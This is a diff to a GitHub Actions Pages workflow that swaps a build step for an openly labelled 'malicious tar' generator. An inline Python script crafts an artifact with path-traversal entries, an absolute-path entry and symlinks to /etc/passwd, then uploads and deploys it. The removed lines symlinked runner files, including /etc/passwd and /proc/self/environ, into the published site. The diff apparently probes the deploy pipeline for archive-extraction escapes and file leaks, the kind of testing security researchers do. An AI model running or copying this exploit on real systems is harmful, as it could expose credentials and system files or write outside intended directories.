@@ -14,21 +14,49 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: Build
+      - name: Build malicious tar manually
         run: |
           mkdir -p out
-          echo "<h1>BENIGN INDEX</h1><pre>" > out/index.html
-          echo "PASSWD_FILE_FOLLOWS:" > out/passwd_link.html
-          # Try absolute symlinks to runner-side files
-          ln -s /etc/hostname out/hostname.txt
-          ln -s /etc/os-release out/os.txt
-          ln -s /etc/passwd out/passwd.txt
-          ln -s /proc/self/environ out/environ.txt
-          ls -la out/
-      - uses: actions/upload-pages-artifact@v3
+          echo "<h1>Index</h1>" > out/index.html
+          # Build the artifact tar manually with path-traversal entries
+          cd out
+          # Create a tarball that, when extracted, escapes
+          # Using Python to craft the tar with absolute and ../ entries
+          python3 - <<'PYEOF'
+          import tarfile, io, os
+          tf = tarfile.open('/tmp/artifact.tar', 'w')
+          # Normal entry
+          ti = tarfile.TarInfo('index.html')
+          ti.size = len('<h1>Index</h1>\n')
+          tf.addfile(ti, io.BytesIO(b'<h1>Index</h1>\n'))
+          # Path traversal entry
+          ti2 = tarfile.TarInfo('../../../escaped.html')
+          ti2.size = 8
+          tf.addfile(ti2, io.BytesIO(b'ESCAPED\n'))
+          # Absolute path entry
+          ti3 = tarfile.TarInfo('/abs_escape.html')
+          ti3.size = 8
+          tf.addfile(ti3, io.BytesIO(b'ABSPATH\n'))
+          # Symlink entry to /etc/passwd
+          ti4 = tarfile.TarInfo('passwd_sym.html')
+          ti4.type = tarfile.SYMTYPE
+          ti4.linkname = '/etc/passwd'
+          tf.addfile(ti4)
+          # Symlink entry escaping
+          ti5 = tarfile.TarInfo('rel_passwd.html')
+          ti5.type = tarfile.SYMTYPE
+          ti5.linkname = '../../../etc/passwd'
+          tf.addfile(ti5)
+          tf.close()
+          PYEOF
+          ls -la /tmp/artifact.tar
+          tar tvf /tmp/artifact.tar
+      - name: Upload manually
+        uses: actions/upload-artifact@v4
         with:
-          path: out
+          name: github-pages
+          path: /tmp/artifact.tar
+          retention-days: 1
   deploy:
     needs: build
     runs-on: ubuntu-latest
@@ -38,3 +66,5 @@ jobs:
     steps:
       - id: deployment
         uses: actions/deploy-pages@v4
+        with:
+          artifact_name: github-pages
